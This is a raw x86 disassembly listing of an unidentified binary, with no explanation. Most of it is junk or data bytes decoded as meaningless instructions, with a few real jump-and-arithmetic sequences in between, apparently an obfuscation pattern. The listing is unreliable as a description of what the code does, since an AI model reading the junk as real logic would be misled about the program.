  411418:	xlat   BYTE PTR ds:[ebx]
  411419:	mov    eax,ds:0x51334d16
  41141e:	pusha  
  41141f:	sub    eax,0xa5de5e67
  411424:	icebp  
  411425:	cld    
  411426:	fild   WORD PTR [ebx+ebx*2+0x69]
  41142a:	enter  0x7238,0x1b
  41142e:	and    bl,BYTE PTR [ecx]
  411430:	call   0x650ffeec
  411435:	cmp    al,0xf9
  411437:	or     DWORD PTR [eax+esi*2+0x4c5c84e2],esp
  41143e:	call   0x30e9ea3a
  411443:	ja     0x4114b9
  411445:	shr    BYTE PTR [ebx+0x5976018c],1
  41144b:	push   edi
  41144c:	add    BYTE PTR [ebp-0xa34ae8d],cl
  411452:	jl     0x411483
  411454:	pop    ecx
  411455:	aaa    
  411456:	pushf  
  411457:	xchg   dh,ch
  411459:	inc    edi
  41145a:	mov    al,BYTE PTR [ebx-0x1a7cca28]
  411460:	inc    ebx
  411461:	or     dh,BYTE PTR ds:0x7f0e7f04
  411467:	into   
  411468:	ins    BYTE PTR es:[edi],dx
  411469:	sub    al,BYTE PTR [ebp-0x51]
  41146c:	mov    ecx,cs
  41146e:	lods   al,BYTE PTR ds:[esi]
  41146f:	mov    dh,0x99
  411471:	call   0x6a9e:0x6219783c
  411478:	sbb    DWORD PTR [ecx],ebx
  41147a:	(bad)  
  41147b:	bound  ebx,QWORD PTR [edx-0x41fed413]
  411481:	inc    esi
  411482:	pop    es
  411483:	enter  0x2e89,0xd7
  411487:	loopne 0x41142a
  411489:	xchg   esi,eax
  41148a:	adc    eax,0xa2dd0e69
  41148f:	xor    ecx,DWORD PTR [eax]
  411491:	jns    0x41148e
  411493:	and    DWORD PTR [edi+0xc],esp
  411496:	retf   0x1d26
  411499:	jle    0x4114bf
  41149b:	stos   DWORD PTR es:[edi],eax
  41149c:	sar    DWORD PTR [edi+0x735f28ee],0xbb
  4114a3:	jnp    0x411511
  4114a5:	arpl   WORD PTR [ebx-0x16],si
  4114a8:	les    ebp,FWORD PTR [edi]
  4114aa:	(bad)  
  4114ab:	adc    BYTE PTR [eax+0x111b7cf9],dl
  4114b1:	sbb    ecx,DWORD PTR [esi-0x18]
  4114b4:	lahf   
  4114b5:	jae    0x41149f
  4114b7:	jbe    0x4114ed
  4114b9:	daa    
  4114ba:	jmp    0xe6f6:0x38e4680
  4114c1:	xchg   BYTE PTR [ebx-0x49],bh
  4114c4:	add    dh,BYTE PTR [esi]
  4114c6:	inc    ecx
  4114c7:	mov    bl,0xd2
  4114c9:	loope  0x411526
  4114cb:	nop
  4114cc:	add    al,0x1f
  4114ce:	push   esp
  4114cf:	sub    DWORD PTR fs:[esi],edx
  4114d2:	pop    esp
  4114d3:	push   edi
  4114d4:	out    0x24,al
  4114d6:	lods   eax,DWORD PTR ds:[esi]
  4114d7:	in     eax,0x91
  4114d9:	xchg   esp,eax
  4114da:	popa   
  4114db:	push   0x5f
  4114dd:	adc    al,0xc7
  4114df:	fwait
  4114e0:	cmp    DWORD PTR [ecx],eax
  4114e2:	push   0x14a1f3e8
  4114e7:	(bad)  
  4114e8:	cmp    DWORD PTR [esi-0x1dfb4570],eax
  4114ee:	mov    edi,DWORD PTR [ebp-0x8]
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	mov    edx,DWORD PTR [esi-0x19]
  411512:	ja     0x4114d3
  411514:	pop    ebp
  411515:	js     0x41158f
  411517:	in     eax,0x7e
  411519:	js     0x411593
  41151b:	icebp  
  41151c:	and    al,0xa2
  41151e:	scas   al,BYTE PTR es:[edi]
  41151f:	push   es
  411520:	sub    eax,0x2fa9f141
  411525:	mov    edx,0x7eeba93b
  41152a:	test   eax,0xf2acca0f
  41152f:	mov    edi,ebx
  411531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411532:	gs call 0x9495:0xac2ccf7b
  41153a:	ror    ah,1
  41153c:	mov    al,ds:0x6371a17c
  411541:	cwde   
  411542:	push   es
  411543:	push   cs
  411544:	pop    ebx
  411545:	int    0x15
  411547:	mov    al,0x83
  411549:	and    ch,BYTE PTR [ecx+0x612c309]
  41154f:	ds in  eax,dx
  411551:	outs   dx,DWORD PTR ds:[esi]
  411552:	dec    esp
  411553:	std    
  411554:	lods   eax,DWORD PTR ds:[esi]
  411555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411556:	out    dx,eax
  411557:	(bad)  
  411558:	popa   
  411559:	ret    
  41155a:	push   ebx
  41155b:	dec    edx
  41155c:	cmp    ebx,edx
  41155e:	xor    al,0x3d
  411560:	out    0x84,al
  411562:	je     0x4115d5
  411564:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411566:	mov    ah,0xbd
  411568:	and    edi,DWORD PTR [esi+0x33]
  41156b:	aas    
  41156c:	adc    al,0x2
  41156e:	sbb    ebx,DWORD PTR [eax+0x5ffab731]
  411574:	push   eax
  411575:	xor    cl,dh
  411577:	stos   DWORD PTR es:[edi],eax
  411578:	rol    BYTE PTR [eax-0x7d],0x9
  41157c:	push   ebx
  41157d:	in     eax,dx
  41157e:	mov    edi,edx
  411580:	or     ebp,ebx
  411582:	leave  
  411583:	pusha  
  411584:	stos   DWORD PTR es:[edi],eax
  411585:	popa   
  411586:	pushf  
  411587:	(bad)  
  411588:	scas   al,BYTE PTR es:[edi]
  411589:	mov    ebp,0x4a52e365
  41158e:	xchg   edx,eax
  41158f:	in     al,dx
  411590:	add    eax,0xa60a4fa6
  411595:	stos   BYTE PTR es:[edi],al
  411596:	test   eax,0xe3e5f42f
  41159b:	(bad)  
  41159c:	popa   
  41159d:	daa    
  41159e:	cmc    
  41159f:	aam    0x43
  4115a1:	pop    es
  4115a2:	ja     0x4115bc
  4115a4:	icebp  
  4115a5:	arpl   di,ax
  4115a7:	ret    
  4115a8:	ins    BYTE PTR es:[edi],dx
  4115a9:	cmp    esi,DWORD PTR [eax]
  4115ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ac:	jg     0x41159a
  4115ae:	call   0x84c9:0x6307e07e
  4115b5:	sub    ch,BYTE PTR [ecx+eiz*4+0x34]
  4115b9:	pushf  
  4115ba:	mov    edi,0x17e8dde2
  4115bf:	ret    
  4115c0:	sub    ebx,DWORD PTR [edx+0x3380d1e9]
  4115c6:	retf   
  4115c7:	in     al,dx
  4115c8:	test   BYTE PTR ds:0xcdcc1cb8,dl
  4115ce:	inc    edx
  4115cf:	ss push eax
  4115d1:	jnp    0x4115c0
  4115d3:	inc    esp
  4115d4:	aas    
  4115d5:	call   0xc216c913
  4115da:	jns    0x41165a
  4115dc:	iret   
  4115dd:	daa    
  4115de:	outs   dx,BYTE PTR ds:[esi]
  4115df:	in     eax,0x7a
  4115e1:	lds    edx,FWORD PTR ds:0x673703fb
  4115e7:	and    al,BYTE PTR [edx+0x7f]
  4115ea:	pop    edx
  4115eb:	ror    BYTE PTR [edi-0x50eb6ff7],cl
  4115f1:	mov    ebx,0xdeee27d2
  4115f6:	dec    esp
  4115f7:	inc    edx
  4115f8:	mov    edi,0x6ee893d1
  4115fd:	pop    esi
  4115fe:	pop    ss
  4115ff:	jno    0x411595
  411601:	in     eax,0x64
  411603:	int3   
  411604:	and    eax,0x25048547
  411609:	mov    ecx,0x97ff2833
  41160e:	(bad)  
  411611:	dec    edi
  411612:	inc    edi
  411613:	cli    
  411614:	aaa    
  411615:	retf   
  411616:	dec    edi
  411617:	adc    ecx,DWORD PTR [eax]
  411619:	in     al,0x4c
  41161b:	dec    esp
  41161c:	paddsb mm2,QWORD PTR [ebx-0x1a]
  411620:	jecxz  0x4115d3
  411622:	mov    edi,0x7864d778
  411627:	enter  0x18c3,0x31
  41162b:	push   cs
  41162c:	(bad)  
  41162d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41162e:	sub    ebp,0xffffffb6
  411631:	nop
  411632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411633:	pop    eax
  411634:	push   edx
  411635:	fistp  WORD PTR [ebp-0x11]
  411638:	adc    BYTE PTR [edx-0x5ff2f5c5],ah
  41163e:	call   0x5554a637
  411643:	jns    0x41165d
  411645:	mov    esi,0xfa462f3c
  41164a:	test   DWORD PTR [ebp-0x768d33b],esp
  411650:	adc    BYTE PTR [eax+0x28eb110e],ch
  411656:	push   cs
  411657:	pop    esi
  411658:	cmp    DWORD PTR [ecx+0x6698d794],esp
  41165e:	push   cs
  41165f:	scas   al,BYTE PTR es:[edi]
  411660:	retf   0x8869
  411663:	mov    esp,0xb968c22f
  411668:	pop    ebx
  411669:	and    BYTE PTR [ebx+0x30],al
  41166c:	push   es
  41166d:	fwait
  41166e:	pushw  0x30b7
  411672:	(bad)
  411676:	mov    bh,0xef
  411678:	ret    0xe2c0
  41167b:	push   cs
  41167c:	(bad)
  411682:	jno    0x411622
  411684:	xor    BYTE PTR [esi-0x5322c22a],bh
  41168a:	pusha  
  41168b:	xchg   ecx,eax
  41168c:	movsx  edx,bx
  41168f:	mul    BYTE PTR [eax+0x16]
  411692:	ja     0x41168c
  411694:	lahf   
  411695:	add    edx,esi
  411697:	mov    ebx,0x4db51fd1
  41169c:	loop   0x41168f
  41169e:	sahf   
  41169f:	push   ecx
  4116a0:	rcl    BYTE PTR [edi-0x5d],0xaf
  4116a4:	push   es
  4116a5:	hlt    
  4116a6:	mov    esi,0xc546f272
  4116ab:	pop    edx
  4116ac:	test   BYTE PTR [edx-0x74b21fc2],cl
  4116b2:	mov    ebp,0xd9bebc54
  4116b7:	xlat   BYTE PTR ds:[ebx]
  4116b8:	dec    edx
  4116b9:	jecxz  0x411701
  4116bb:	outs   dx,BYTE PTR ds:[esi]
  4116bc:	retf   0x61fc
  4116bf:	mov    WORD PTR ds:0xce49eeca,ds
  4116c5:	xchg   dx,ax
  4116c7:	jl     0x411706
  4116c9:	cmp    BYTE PTR [esi+0x5c61a052],al
  4116cf:	mov    edx,0x1dc7209
  4116d4:	cmp    BYTE PTR [ecx-0x361071b1],0xfa
  4116db:	clc    
  4116dc:	arpl   WORD PTR [edi+0x6325debd],dx
  4116e2:	dec    ebx
  4116e3:	pop    ds
  4116e4:	mov    bl,0x95
  4116e6:	xchg   esi,eax
  4116e7:	pop    ss
  4116e8:	jl     0x411761
  4116ea:	and    DWORD PTR [ecx],esi
  4116ec:	mov    DWORD PTR [ebx-0x4063dd9e],0x520569fb
  4116f6:	scas   eax,DWORD PTR es:[edi]
  4116f7:	push   es
  4116f8:	imul   eax,DWORD PTR [edx-0x3a],0x14705a26
  4116ff:	pop    es
  411700:	sub    DWORD PTR [ebx-0x630e5fca],edx
  411706:	repnz and eax,0x4b3c9f2
  41170c:	aas    
  41170d:	aaa    
  41170e:	gs imul esp,ecx,0xfcec9d15
  411715:	fstp   QWORD PTR [edx+0xc293b18]
  41171b:	ficomp DWORD PTR [edx-0x1b]
  41171e:	fdiv   st,st(7)
  411720:	lea    edx,[esi]
  411722:	mov    dh,0x6
  411724:	add    esp,DWORD PTR [edi]
  411726:	add    DWORD PTR [ebp+0x773c7e0b],esi
  41172c:	fcomp  QWORD PTR [ebp-0x2c]
  41172f:	daa    
  411730:	test   eax,0xcbc7f6f8
  411735:	xlat   BYTE PTR ds:[ebx]
  411736:	sbb    BYTE PTR [eax+0x5428eca0],ah
  41173c:	adc    eax,0xb132c4bc
  411741:	mov    ch,BYTE PTR [ebp-0x43]
  411744:	mov    eax,0x45d1216c
  411749:	pop    edx
  41174a:	sub    al,0xf9
  41174c:	xor    ecx,DWORD PTR ds:0x485f3205
  411752:	xchg   ebp,eax
  411753:	ss adc eax,esp
  411756:	cwde   
  411757:	test   BYTE PTR [edi],ch
  411759:	jmp    0x4cfd:0x1a62158f
  411760:	arpl   cx,bx
  411762:	not    BYTE PTR [edx]
  411764:	mov    ebp,0x7dd40897
  411769:	or     edi,edi
  41176b:	cmp    BYTE PTR [esi+esi*4-0x22],0xdd
  411770:	add    eax,0xeb99d0a
  411775:	add    edi,DWORD PTR [eax-0x57]
  411778:	cld    
  411779:	xor    BYTE PTR [ebx-0x69],bl
  41177c:	inc    ecx
  41177d:	dec    eax
  41177e:	scas   eax,DWORD PTR es:[edi]
  41177f:	cmp    BYTE PTR [ebp+0x67],0xa2
  411783:	pushf  
  411784:	dec    edx
  411785:	dec    edi
  411786:	mov    edx,DWORD PTR [ebp-0x30]
  411789:	jmp    0x411f76
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	rcr    al,cl
  4117b5:	jg     0x411805
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	add    BYTE PTR [ebp+0x395d781f],dh
  4117c5:	sbb    DWORD PTR [edi],esp
  4117c7:	rcl    BYTE PTR [eax-0x7540f9d9],1
  4117cd:	mov    bh,0x6d
  4117cf:	je     0x411815
  4117d1:	mov    al,0x32
  4117d3:	inc    esp
  4117d4:	dec    ebx
  4117d5:	push   esp
  4117d6:	add    BYTE PTR [ebx-0x3b3348af],0x9c
  4117dd:	inc    eax
  4117de:	xchg   edx,eax
  4117df:	sti    
  4117e0:	add    ah,bh
  4117e2:	outs   dx,DWORD PTR ds:[esi]
  4117e3:	push   eax
  4117e4:	idiv   bh
  4117e6:	xchg   bl,bh
  4117e8:	addr16 push 0xca7ed82e
  4117ee:	daa    
  4117ef:	test   DWORD PTR [esp+ecx*1+0x8],0x79f1d7ef
  4117f7:	xor    BYTE PTR ds:0x18ac7710,dh
  4117fd:	fcmovne st,st(2)
  4117ff:	jl     0x4117a4
  411801:	mov    ecx,0xf0d7a812
  411806:	push   ebp
  411807:	xor    esp,DWORD PTR [eax+0x12aa53f3]
  41180d:	sub    al,0xdb
  41180f:	add    esp,DWORD PTR [edi]
  411811:	ret    0x6c27
  411814:	jno    0x4117ae
  411816:	frstorw [edx]
  411819:	xchg   esi,eax
  41181a:	add    DWORD PTR [ebx],ebp
  41181c:	or     ch,BYTE PTR [ebx]
  41181e:	dec    ebp
  41181f:	retf   
  411820:	and    eax,0x1e1d0858
  411825:	dec    edi
  411826:	sar    DWORD PTR [edi+ebx*1+0x4cce4148],cl
  41182d:	(bad)  [esi+0x38]
  411830:	test   al,0x54
  411832:	pop    edx
  411833:	std    
  411834:	cmc    
  411835:	in     eax,0x78
  411837:	ins    DWORD PTR es:[edi],dx
  411838:	test   al,0xc4
  41183a:	aad    0x49
  41183c:	arpl   WORD PTR [edx-0x19],ax
  41183f:	clc    
  411840:	inc    edi
  411841:	scas   eax,DWORD PTR es:[edi]
  411842:	dec    ebx
  411843:	push   eax
  411844:	data16 aaa 
  411846:	push   ds
  411847:	mov    ah,0xb8
  411849:	jo     0x4118b2
  41184b:	stc    
  41184c:	stc    
  41184d:	adc    eax,esi
  41184f:	fdiv   st(7),st
  411851:	adc    cl,BYTE PTR [edx]
  411853:	imul   BYTE PTR [edx+0x0]
  411856:	mov    edi,0xdc0c1fbe
  41185b:	push   ebx
  41185c:	sbb    al,0x90
  41185e:	push   cs
  41185f:	nop
  411860:	cmp    eax,0x400faddf
  411865:	add    al,0x23
  411867:	imul   esp,DWORD PTR [ebp+edi*4+0x1a],0xc
  41186c:	jg     0x41189d
  41186e:	ret    
  41186f:	lahf   
  411870:	in     eax,dx
  411871:	dec    edx
  411872:	xor    ecx,esp
  411874:	or     BYTE PTR [ebx],ch
  411876:	aaa    
  411877:	out    dx,al
  411878:	call   0x56c7c518
  41187d:	cmp    eax,0xbad23b04
  411882:	clc    
  411883:	pop    ebp
  411884:	add    al,0x98
  411886:	sti    
  411887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411888:	add    al,0x14
  41188a:	add    BYTE PTR [ecx+0xa],bh
  41188d:	int    0x60
  41188f:	mov    ds:0x1fa1d938,al
  411894:	xchg   esp,eax
  411895:	mov    ds:0xaf2a77e6,al
  41189a:	xlat   BYTE PTR ds:[ebx]
  41189b:	and    dh,BYTE PTR [ebp+0x39002327]
  4118a1:	jle    0x41191b
  4118a3:	sbb    BYTE PTR [eax],0x7f
  4118a6:	arpl   WORD PTR [edx],ax
  4118a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118a9:	add    al,0xae
  4118ab:	retf   0xbb62
  4118ae:	jmp    0xa38bac74
  4118b3:	sbb    eax,0xef2ca5ac
  4118b8:	js     0x411884
  4118ba:	push   esi
  4118bb:	jmp    0x567b30de
  4118c0:	or     edi,DWORD PTR [esi]
  4118c2:	es aam 0xa0
  4118c5:	jmp    0x41191f
  4118c7:	mov    edx,eax
  4118c9:	mov    eax,DWORD PTR [edi+esi*8-0x3b2015c7]
  4118d0:	pop    es
  4118d1:	or     eax,0xe1a762d9
  4118d6:	or     eax,0x439caadc
  4118db:	sub    BYTE PTR [ebx],0xa6
  4118de:	jns    0x4118d1
  4118e0:	loope  0x411908
  4118e2:	xor    ch,BYTE PTR [ebx-0x49]
  4118e5:	xchg   DWORD PTR [esi-0x3780c67e],esp
  4118eb:	xor    al,0x40
  4118ed:	loope  0x411963
  4118ef:	shl    BYTE PTR fs:[esi+0x6e4c7d81],cl
  4118f6:	and    BYTE PTR [ebp-0x5083c6df],bh
  4118fc:	sahf   
  4118fd:	loop   0x411960
  4118ff:	rol    DWORD PTR [ebx],1
  411901:	xchg   edx,eax
  411902:	jmp    0x322be460
  411907:	retf   0x6baa
  41190a:	sub    al,0xb1
  41190c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190d:	or     bl,BYTE PTR [edx+0x4e]
  411910:	sub    edi,DWORD PTR [edx-0x6d9c9f33]
  411916:	fnsave [esi-0x34d21ec]
  41191c:	aam    0x69
  41191e:	and    ch,BYTE PTR [edx-0x5eb3d8a7]
  411924:	frstor [ecx-0x1f516d55]
  41192a:	sahf   
  41192b:	sbb    DWORD PTR [ecx-0x40a11be4],ebx
  411931:	or     BYTE PTR [ebx],dh
  411933:	xor    dl,BYTE PTR [ecx-0x7eec5567]
  411939:	jmp    0x41198a
  41193b:	xor    eax,0x3baec8b5
  411940:	adc    al,0x65
  411942:	mov    ch,0x75
  411945:	ja     0x4119b3
  411947:	fiadd  WORD PTR ds:0x2fbdc646
  41194d:	or     al,bl
  41194f:	jmp    0x724c:0xe949e32b
  411956:	pop    ecx
  411957:	mov    dh,0x11
  411959:	iret   
  41195a:	push   edx
  41195b:	and    edx,esp
  41195d:	add    BYTE PTR [eax-0x793faf2c],dl
  411963:	fiadd  WORD PTR [eax-0x1]
  411966:	shl    DWORD PTR [esi-0xb],1
  411969:	xchg   ebx,eax
  41196a:	sbb    esi,DWORD PTR [ebx-0x36]
  41196d:	fld    st(7)
  41196f:	adc    eax,0x3c8bb989
  411974:	das    
  411975:	call   DWORD PTR [eax-0x41]
  411978:	ins    DWORD PTR es:[edi],dx
  411979:	clc    
  41197a:	cli    
  41197b:	test   al,0xc7
  41197d:	lahf   
  41197e:	les    eax,FWORD PTR [eax]
  411980:	test   BYTE PTR [ecx-0x31],dl
  411983:	inc    edi
  411984:	jb     0x411980
  411986:	adc    eax,0xa1b0703f
  41198b:	xchg   BYTE PTR [edx-0x2f],bh
  41198e:	or     BYTE PTR [eax],cl
  411990:	out    0x4c,al
  411992:	mov    al,BYTE PTR [edx-0x2b]
  411995:	mov    edi,DWORD PTR [eax-0x12]
  411998:	iret   
  411999:	mov    dh,BYTE PTR fs:[edi+0x29]
  41199d:	jg     0x411937
  41199f:	test   eax,0xcab7f9a1
  4119a4:	sar    DWORD PTR ds:0xdbd74f,0x1c
  4119ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ac:	jl     0x4119ca
  4119ae:	inc    esp
  4119af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119b0:	add    dh,BYTE PTR [esi]
  4119b2:	cmp    bh,BYTE PTR [ecx]
  4119b4:	inc    ecx
  4119b5:	loopne 0x4119ea
  4119b7:	aam    0x50
  4119b9:	mov    al,ds:0x3949e9d1
  4119be:	jmp    0x4119a6
  4119c0:	div    ch
  4119c2:	jno    0x411a42
  4119c4:	inc    eax
  4119c5:	fstp   QWORD PTR [edi-0x61b488a5]
  4119cb:	out    dx,eax
  4119cc:	and    al,0xfa
  4119ce:	add    ebx,DWORD PTR [ebx+ebx*8]
  4119d1:	mov    DWORD PTR [ecx-0xab34ad6],ecx
  4119d7:	retf   0x4ad9
  4119da:	fs mov bl,0xc0
  4119dd:	or     esp,DWORD PTR [eax-0x22a74e5b]
  4119e3:	outs   dx,BYTE PTR ds:[esi]
  4119e4:	out    0x28,al
  4119e6:	push   0xeb11c6c1
  4119eb:	mov    ebp,0x7fb6fdc4
  4119f0:	mov    DWORD PTR [ebx],ebx
  4119f2:	ss xor al,0xe1
  4119f5:	dec    edi
  4119f6:	das    
  4119f7:	sub    eax,0x58fda6b5
  4119fc:	lods   eax,DWORD PTR ds:[esi]
  4119fd:	stos   BYTE PTR es:[edi],al
  4119fe:	std    
  4119ff:	push   cs
  411a00:	es xchg esi,eax
  411a02:	inc    ebp
  411a03:	and    BYTE PTR [eax+0x3],bl
  411a06:	clc    
  411a07:	mov    ebp,0xdd120233
  411a0c:	div    ebx
  411a0e:	imul   ecx,DWORD PTR [ebx],0xffffffdc
  411a11:	dec    ecx
  411a12:	cmp    eax,0x262b95d8
  411a17:	stc    
  411a18:	retf   
  411a19:	fnsave [esi+0x75]
  411a1c:	and    eax,0xdc7b369e
  411a21:	ss (bad) 
  411a23:	sub    bh,BYTE PTR [edi-0x1a07de9c]
  411a29:	pusha  
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xc7d7da8b
  411a62:	imul   edi,DWORD PTR [edi+0x78609194],0x787ee578
  411a6c:	js     0x411a5a
  411a6e:	pusha  
  411a6f:	and    DWORD PTR [ebp+0x5133daa7],0x7fcdb515
  411a79:	jg     0x411a31
  411a7b:	sbb    bl,0x86
  411a7e:	sbb    esp,ecx
  411a80:	xchg   ecx,eax
  411a81:	pushf  
  411a82:	mov    eax,0x110116ce
  411a87:	or     BYTE PTR [edx],bl
  411a89:	je     0x411b00
  411a8b:	xor    esi,0xac6d10b0
  411a91:	shl    al,0xf3
  411a94:	idiv   BYTE PTR [esi+edx*2-0x29]
  411a98:	pop    ecx
  411a99:	pop    edi
  411a9a:	pop    ebp
  411a9b:	in     al,dx
  411a9c:	dec    esp
  411a9d:	xchg   ebx,eax
  411a9e:	or     bh,BYTE PTR [edx+0xed1a3da]
  411aa4:	aas    
  411aa5:	mov    al,ds:0x81c4fe51
  411aaa:	cmp    edx,DWORD PTR [ecx+0x996e99f]
  411ab0:	xchg   edi,eax
  411ab1:	stc    
  411ab2:	rsm    
  411ab4:	mov    ah,0x9
  411ab6:	ret    0x6425
  411ab9:	ins    BYTE PTR es:[edi],dx
  411aba:	shr    BYTE PTR ds:0x540960d5,0xe2
  411ac1:	sbb    esp,esi
  411ac3:	stc    
  411ac4:	and    eax,0x8dabea34
  411ac9:	sar    esp,cl
  411acb:	jp     0x411a7c
  411acd:	add    al,0x86
  411acf:	or     eax,0x87f78b
  411ad4:	push   eax
  411ad5:	adc    ebp,DWORD PTR [edi-0x216962f0]
  411adb:	loope  0x411ac6
  411add:	adc    eax,0x3ccc9912
  411ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae3:	inc    ebp
  411ae4:	xchg   ebp,eax
  411ae5:	neg    DWORD PTR [edi+ebx*8]
  411ae8:	or     BYTE PTR ds:0xf639cb7,bl
  411aee:	arpl   WORD PTR [ecx],cx
  411af0:	push   ebp
  411af1:	mov    bh,0x3e
  411af3:	mov    edx,0xadf6499f
  411af8:	lods   eax,DWORD PTR ds:[esi]
  411af9:	mov    esi,0x916e1bef
  411afe:	mov    esp,0x74df109d
  411b03:	inc    edx
  411b04:	call   0xe7199abd
  411b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b0a:	fadd   QWORD PTR [edx+0xb01aee2]
  411b10:	jmp    DWORD PTR [edi+0x66c83217]
  411b16:	pop    eax
  411b17:	sub    BYTE PTR [edi+ecx*2+0x48cc57b5],0x39
  411b1f:	fisub  DWORD PTR [ebp+0x6545f9d8]
  411b25:	imul   edx,DWORD PTR [eax*8-0x5395fccf],0x812286e5
  411b30:	push   ss
  411b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b32:	push   ebx
  411b33:	les    ebp,FWORD PTR [ebx+edi*4+0x30]
  411b37:	mov    eax,ds:0x6d13d1b7
  411b3c:	sbb    al,0xc7
  411b3e:	loopne 0x411b53
  411b40:	in     eax,dx
  411b41:	cld    
  411b42:	fmul   QWORD PTR [ebp+0x6a]
  411b45:	hlt    
  411b46:	repz or DWORD PTR [edi+0x6f],ebx
  411b4a:	or     DWORD PTR [ebx-0x5e04b3ed],0x26c9d6d
  411b54:	or     al,0x77
  411b56:	add    al,BYTE PTR [eax]
  411b58:	push   edx
  411b59:	add    eax,edi
  411b5b:	call   0x6dca:0xd1920e1
  411b62:	in     eax,0x49
  411b64:	and    DWORD PTR [eax],ebp
  411b66:	out    0x88,eax
  411b68:	(bad)  
  411b69:	iret   
  411b6a:	dec    edx
  411b6b:	daa    
  411b6c:	fimul  DWORD PTR ds:0xd2d22770
  411b72:	pop    eax
  411b73:	inc    esi
  411b74:	dec    edi
  411b75:	mov    al,ds:0xf31312e2
  411b7a:	arpl   di,ax
  411b7c:	lock xchg ebp,eax
  411b7e:	jg     0x411b45
  411b80:	jmp    0x411bba
  411b82:	inc    ecx
  411b83:	or     cl,ah
  411b85:	adc    DWORD PTR [edi+0x126851c4],ebp
  411b8b:	sbb    al,dl
  411b8d:	jbe    0x411b37
  411b8f:	sbb    DWORD PTR [edi-0x1b],ebx
  411b92:	xor    al,0x53
  411b94:	push   ds
  411b95:	ret    
  411b96:	cdq    
  411b97:	dec    ebp
  411b98:	sub    eax,ebx
  411b9a:	in     al,dx
  411b9b:	push   edi
  411b9c:	jecxz  0x411bf2
  411b9e:	and    eax,0x53b09b8d
  411ba3:	push   ss
  411ba4:	inc    ebx
  411ba5:	sbb    al,0xdf
  411ba7:	(bad)  
  411ba8:	jg     0x411bff
  411baa:	leave  
  411bab:	jae    0x411c2b
  411bad:	jo     0x411bf1
  411baf:	outs   dx,DWORD PTR ds:[esi]
  411bb0:	repz retf 0xf3d5
  411bb4:	and    DWORD PTR [ebx-0x4863ddf1],0x28e246da
  411bbe:	adc    DWORD PTR [eax],0x57
  411bc1:	sti    
  411bc2:	or     al,0x11
  411bc4:	push   ss
  411bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc6:	stos   DWORD PTR es:[edi],eax
  411bc7:	rcl    esi,1
  411bc9:	mov    ch,BYTE PTR [ecx+0x26]
  411bcc:	das    
  411bcd:	(bad)  
  411bce:	in     eax,0x8d
  411bd0:	sbb    edi,DWORD PTR [eax]
  411bd2:	push   ds
  411bd3:	jnp    0x411bda
  411bd5:	das    
  411bd6:	daa    
  411bd7:	(bad)  
  411bd9:	rol    DWORD PTR [ebp-0x9594c01],1
  411bdf:	cld    
  411be0:	in     eax,dx
  411be1:	add    DWORD PTR [ebp+0x63],0xd642d903
  411be8:	cmp    al,0xb0
  411bea:	sbb    eax,0x83ff27d2
  411bef:	add    DWORD PTR [ebx+0x76],ecx
  411bf2:	sub    ecx,DWORD PTR [esi+0x38]
  411bf5:	sub    BYTE PTR [edx+0x5988f964],ch
  411bfb:	ins    DWORD PTR es:[edi],dx
  411bfc:	fisttp DWORD PTR [ecx+0x5927b534]
  411c02:	mov    eax,0xcf705610
  411c07:	pop    eax
  411c08:	sbb    eax,DWORD PTR [esi]
  411c0a:	dec    edx
  411c0b:	xor    bl,BYTE PTR [esp+eax*4+0x7de10585]
  411c12:	ror    BYTE PTR [edx],1
  411c14:	and    bl,BYTE PTR [ecx+0x74]
  411c17:	sbb    DWORD PTR [ebx+0x52],ebp
  411c1a:	cmp    edx,DWORD PTR [eax-0x76937ce9]
  411c20:	pop    edi
  411c21:	dec    ecx
  411c22:	or     BYTE PTR ds:0xea0f99b4,ch
  411c28:	mov    dh,0x43
  411c2a:	cmc    
  411c2b:	add    DWORD PTR [ebx+0x62540e02],ebp
  411c31:	mov    eax,0x2d3be517
